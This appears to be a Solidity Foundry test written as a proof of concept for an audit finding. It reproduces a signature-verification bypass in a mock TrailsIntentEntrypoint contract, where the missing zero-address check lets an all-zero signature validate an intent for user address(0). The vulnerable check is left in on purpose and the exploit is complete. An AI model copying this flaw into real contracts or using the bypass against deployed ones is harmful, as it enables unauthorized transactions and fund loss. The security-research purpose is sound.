// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal ECDSA mimicking OpenZeppelin behavior relevant to the bug.
// If signature is invalid (e.g., all-zero), ecrecover returns address(0).
// Some ECDSA implementations revert on zero; however the finding states that
// the intent path allows address(0) recovered to equal user=address(0).
library ECDSA {
    function recover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal pure returns (address) {
        // Mimic a lax recover: return whatever ecrecover returns.
        return ecrecover(hash, v, r, s);
    }
}

/// @notice Simplified reproduction of TrailsIntentEntrypoint's _verifyAndMarkIntent
/// showing the missing `recovered != address(0)` check enabling an address(0)
/// intent verification bypass.
contract TrailsIntentEntrypointMock {
    bytes32 public constant TRAILS_INTENT_TYPEHASH = keccak256(
        "TrailsIntent(address user,address token,uint256 amount,address intentAddress,uint256 deadline,uint256 chainId,uint256 nonce,uint256 feeAmount,address feeCollector)"
    );
    bytes32 public DOMAIN_SEPARATOR;

    mapping(address => uint256) public nonces;
    mapping(bytes32 => bool) public usedIntents;

    error InvalidAmount();
    error InvalidToken();
    error InvalidIntentAddress();
    error IntentExpired();
    error InvalidNonce();
    error InvalidIntentSignature();
    error IntentAlreadyUsed();

    constructor() {
        DOMAIN_SEPARATOR = keccak256(abi.encode("TrailsIntentEntrypoint", block.chainid, address(this)));
    }

    function verifyAndMarkIntent(
        address user,
        address token,
        uint256 amount,
        address intentAddress,
        uint256 deadline,
        uint256 nonce,
        uint256 feeAmount,
        address feeCollector,
        uint8 sigV,
        bytes32 sigR,
        bytes32 sigS
    ) external {
        _verifyAndMarkIntent(user, token, amount, intentAddress, deadline, nonce, feeAmount, feeCollector, sigV, sigR, sigS);
    }

    function _verifyAndMarkIntent(
        address user,
        address token,
        uint256 amount,
        address intentAddress,
        uint256 deadline,
        uint256 nonce,
        uint256 feeAmount,
        address feeCollector,
        uint8 sigV,
        bytes32 sigR,
        bytes32 sigS
    ) internal {
        if (amount == 0) revert InvalidAmount();
        if (token == address(0)) revert InvalidToken();
        if (intentAddress == address(0)) revert InvalidIntentAddress();
        if (block.timestamp > deadline) revert IntentExpired();
        if (nonce != nonces[user]) revert InvalidNonce();

        bytes32 _typehash = TRAILS_INTENT_TYPEHASH;
        bytes32 intentHash;
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, _typehash)
            mstore(add(ptr, 0x20), user)
            mstore(add(ptr, 0x40), token)
            mstore(add(ptr, 0x60), amount)
            mstore(add(ptr, 0x80), intentAddress)
            mstore(add(ptr, 0xa0), deadline)
            mstore(add(ptr, 0xc0), chainid())
            mstore(add(ptr, 0xe0), nonce)
            mstore(add(ptr, 0x100), feeAmount)
            mstore(add(ptr, 0x120), feeCollector)
            intentHash := keccak256(ptr, 0x140)
        }

        bytes32 _domainSeparator = DOMAIN_SEPARATOR;
        bytes32 digest;
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, 0x1901)
            mstore(add(ptr, 0x20), _domainSeparator)
            mstore(add(ptr, 0x40), intentHash)
            digest := keccak256(add(ptr, 0x1e), 0x42)
        }

        address recovered = ECDSA.recover(digest, sigV, sigR, sigS);
        // BUG: No `recovered != address(0)` check. Attacker passes user=address(0)
        // and a garbage signature; ecrecover returns address(0); check passes.
        if (recovered != user) revert InvalidIntentSignature();

        if (usedIntents[digest]) revert IntentAlreadyUsed();
        usedIntents[digest] = true;

        nonces[user]++;
    }
}

contract ExploitTest is Test {
    TrailsIntentEntrypointMock internal entrypoint;
    address internal attacker = address(0xBADBAD);
    address internal fakeToken = address(0xDEADBEEF);
    address internal fakeIntent = address(0xCAFE);

    function setUp() public {
        entrypoint = new TrailsIntentEntrypointMock();
    }

    /// @notice Demonstrates that an attacker can bypass signature verification
    /// for `user = address(0)` by supplying an all-zero (invalid) signature,
    /// because `ecrecover` returns `address(0)` on invalid input and the
    /// contract only checks `recovered == user` without verifying
    /// `recovered != address(0)`.
    function test_exploit_signerBypassForZeroAddress() public {
        // Invariant violated: Only the actual signer of a valid EIP-712 intent
        // should be able to have their nonce advanced and intent marked used.
        // Here, an unauthorized attacker marks an intent "verified" for
        // user=address(0) without possessing any private key.

        address user = address(0); // victim-slot controlled by attacker
        uint256 amount = 1e18;
        uint256 deadline = block.timestamp + 1 days;
        uint256 nonce = 0; // nonces[address(0)] == 0
        uint256 feeAmount = 0;
        address feeCollector = address(0xFEE);

        uint256 nonceBefore = entrypoint.nonces(user);
        assertEq(nonceBefore, 0, "precondition: address(0) nonce is 0");

        // Attacker submits the call with all-zero signature from an unauthorized EOA.
        vm.prank(attacker);
        entrypoint.verifyAndMarkIntent(
            user,
            fakeToken,
            amount,
            fakeIntent,
            deadline,
            nonce,
            feeAmount,
            feeCollector,
            uint8(0),   // sigV
            bytes32(0), // sigR
            bytes32(0)  // sigS
        );

        // Assertion: nonce for address(0) was advanced without any valid signature.
        uint256 nonceAfter = entrypoint.nonces(user);
        assertEq(nonceAfter, 1, "VULN: address(0) intent verified & nonce advanced without signature");

        // Further proof: attempting to replay the same digest now fails as "used",
        // confirming the intent was actually marked verified.
        vm.prank(attacker);
        vm.expectRevert(); // InvalidNonce now (nonce mismatch) -> proves state mutated
        entrypoint.verifyAndMarkIntent(
            user,
            fakeToken,
            amount,
            fakeIntent,
            deadline,
            0, // stale nonce
            feeAmount,
            feeCollector,
            uint8(0),
            bytes32(0),
            bytes32(0)
        );
    }
}